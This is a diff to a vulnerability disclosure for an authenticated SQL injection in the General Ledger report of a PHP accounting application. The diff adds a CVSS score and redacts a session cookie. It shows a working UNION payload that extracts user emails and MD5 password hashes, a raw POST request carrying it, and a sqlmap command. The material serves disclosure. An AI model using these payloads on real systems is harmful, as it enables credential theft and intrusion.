@@ -10,6 +10,8 @@
 | **Type**    | SQL Injection (CWE-89)                     |
 | **Author**  | Kevin Chiang                               |
 | **Date**    | 2026-05-04                                 |
+| **CVSS**    | 7.2 (AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N)  |
+
 
 ---
 
@@ -47,7 +49,7 @@ $this->db->where('VDate BETWEEN "'.$dtpFromDate.'" and "'.$dtpToDate.'"');
 - OS: Ubuntu 22.04.5 LTS
 - Web Server: Apache 2.4.18
 - PHP: 7.0.5
-- Test URL: `http://localhost:8080/multistore/`
+- Test URL: `http://localhost:8080/`
 
 ### Steps (Browser — No Tools Required)
 
@@ -56,7 +58,7 @@ $this->db->where('VDate BETWEEN "'.$dtpFromDate.'" and "'.$dtpToDate.'"');
 2. Log in with an **admin** account
 3. Navigate to: **Accounts → Account Reports → General Ledger** 
 <img width="248" height="610" alt="image" src="https://github.com/user-attachments/assets/8e77e9ec-cd7a-4879-bc6b-33e791c16dff" />
-4. In the report form, select any **GL Head** from the dropdown
+4. In the report form, select any **GL Head** from the dropdown (the selected GL code value will be submitted as `cmbGLCode`)
 5. Leave **Transaction Head** blank
 6. Set **From Date** to `2020-01-01`
 7. Set **To Date** to the payload below 
@@ -74,7 +76,8 @@ Paste the following into the **To Date** field:
 ```
 2099-01-01" UNION SELECT email COLLATE utf8_unicode_ci,0,0,password COLLATE utf8_unicode_ci,0,0,0 FROM user LEFT JOIN acc_transaction ON 0=1 WHERE "1"="1
 ```
-<img width="1845" height="800" alt="image" src="https://github.com/user-attachments/assets/3b5baa42-527b-4faf-8399-74de0dff53b7" />
+<img width="1845" height="806" alt="image" src="https://github.com/user-attachments/assets/8710b8b7-410b-44a9-8cc3-9b3fa58bc6ca" />
+
 
 **Expected Result**: The report table displays admin email and
 MD5 password hash from the `user` table.
@@ -91,7 +94,7 @@ MD5 password hash from the `user` table.
 POST /accounts/accounts/accounts_report_search HTTP/1.1
 Host: localhost:8080
 Content-Type: multipart/form-data
-Cookie: ci_session=34aed0cbb0face00d858483e251c665da3fea947
+Cookie: ci_session=[your-session-id]
 
 cmbGLCode=40216&dtpFromDate=2000-01-01&dtpToDate=2099-01-01" UNION SELECT email COLLATE utf8_unicode_ci,0,0,password COLLATE utf8_unicode_ci,0,0,0 FROM user LEFT JOIN acc_transaction ON 0=1 WHERE "1"="1
 ```
@@ -103,7 +106,7 @@ cmbGLCode=40216&dtpFromDate=2000-01-01&dtpToDate=2099-01-01" UNION SELECT email 
 ```bash
 sqlmap -u "http://localhost:8080/accounts/accounts/accounts_report_search" \
   --data="cmbGLCode=40216&dtpFromDate=2000-01-01&dtpToDate=2026-05-04" \
-  --cookie="ci_session=YOUR_SESSION_COOKIE_HERE" \
+  --cookie="ci_session=YOUR_SESSION_COOKIE" \
   --level=3 --risk=2 \
   --dbms=mysql \
   --batch --dbs \
